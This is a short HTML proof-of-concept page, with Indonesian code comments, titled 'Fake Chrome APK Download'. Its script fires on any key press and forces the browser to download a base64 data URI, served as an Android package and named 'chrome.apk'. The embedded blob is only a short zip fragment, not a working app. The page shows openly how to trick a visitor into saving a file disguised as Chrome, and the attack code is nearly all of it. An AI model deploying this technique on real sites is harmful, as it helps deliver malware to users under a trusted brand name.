<!DOCTYPE html>
<html lang="en">
<head>

<body>
  <center><h2>POC: Fake Chrome APK Download</h2></center>

  <script>
    // Listener untuk Keydown
    window.addEventListener('keydown', function(e) {
      // Coba buka download dan manipulasi file
      openDownload();
    });

    // Fungsi untuk membuat file download
    function createDownload(uri, filename) {
      const link = document.createElement("a");
      link.href = uri;
      link.download = filename;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }

    // Fungsi untuk memulai download "APK"
    function openDownload() {
      // Membuat URI data dengan MIME type "application/vnd.android.package-archive"
      const data = "data:application/vnd.android.package-archive;base64,UEsDBBQAAAAIAI5FOoS1c9T5Xq7ht%2F7ckkh57bCeGV0eKZX%2F4wBhAt17JZlMm6Y1A4k2tS8%3D";
      // Memanipulasi nama file menjadi "chrome.apk"
      createDownload(data, "chrome.apk");
    }

  </script>

  <footer>
    <p>Press any key to download.</p>
  </footer>

</body>
</html>
